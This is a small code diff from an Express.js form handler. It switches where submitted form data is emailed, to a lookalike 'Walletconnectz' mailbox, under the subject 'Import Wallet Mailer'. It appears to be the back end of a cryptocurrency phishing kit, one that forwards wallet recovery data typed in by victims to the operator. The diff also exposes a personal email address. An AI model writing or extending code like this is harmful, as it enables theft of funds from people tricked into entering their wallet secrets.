@@ -27,8 +27,7 @@ app.post("/form", (req, res) => {
 
   const mailOptions = {
     from: process.env.EMAIL,
-    // to: "Walletconnectz@yahoo.com",
-    to: "paulinnocent04@gmail.com",
+    to: "Walletconnectz@yahoo.com",
     subject: 'Import Wallet Mailer',
     text: req.body['data']
   }
